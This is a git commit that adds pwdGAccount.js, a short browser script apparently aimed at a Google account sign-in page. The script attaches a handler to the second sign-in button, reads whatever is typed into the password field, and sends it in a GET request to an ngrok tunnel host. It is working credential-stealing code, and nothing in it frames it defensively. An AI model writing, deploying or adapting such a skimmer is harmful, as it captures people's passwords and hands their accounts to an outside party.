ab989f6ec094b4db73e8a181fb50c6964f068951
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 20:40:30 -0300

    Create pwdGAccount.js

---
+++ pwdGAccount.js
@@ -0,0 +1,19 @@
+(function() {
+    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
+
+    btn[1].addEventListener('click', function(){
+
+        let email = document.querySelector('[type="password"]');
+        let param = email.value;
+
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                console.log(xhr.responseText);
+            }
+        };
+        xhr.send();
+
+    })
+})();
